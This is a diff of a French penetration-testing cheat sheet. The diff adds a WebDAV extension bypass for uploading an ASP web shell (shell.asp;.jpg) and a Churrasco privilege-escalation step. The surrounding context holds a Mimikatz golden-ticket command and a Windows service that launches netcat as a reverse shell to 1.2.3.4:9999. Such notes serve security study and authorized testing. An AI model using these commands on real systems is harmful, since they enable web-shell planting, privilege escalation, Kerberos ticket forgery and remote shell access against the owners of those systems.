@@ -80,15 +80,31 @@ go
 
 `kerberos::golden /user:[USER] /domain:[DOMAINE] /sid:[SID de USER] /krbtgt:[NTLM hash de krbtgt] /ticket:evil.tck /ptt` → Créé et inject un golden ticket à la session
 
+
+## WebDav
+
+Cadaver pour se connecter,
+Sur Windows 2000/2003, bypass la restriction de l'extension avec shell.asp;.jpg
+
+```
+PUT shell.jpg
+COPY shell.asp;.jpg
+```
+
 ## Privesc
 
-Créer un service:
+Créer un service (groupe administrateur):
 
 ```
 sc create cmdsvc binpath= "C:\tmp\nc64.exe 1.2.3.4 9999 -e cmd" type= own type= interact
 sc cmdsvc start
 ```
 
+Churrasco (NT Authorithy \ Network Service), lancer deux fois maybe: 
+
+```
+churrasco.exe
+```
 
 ## Pivoting
 
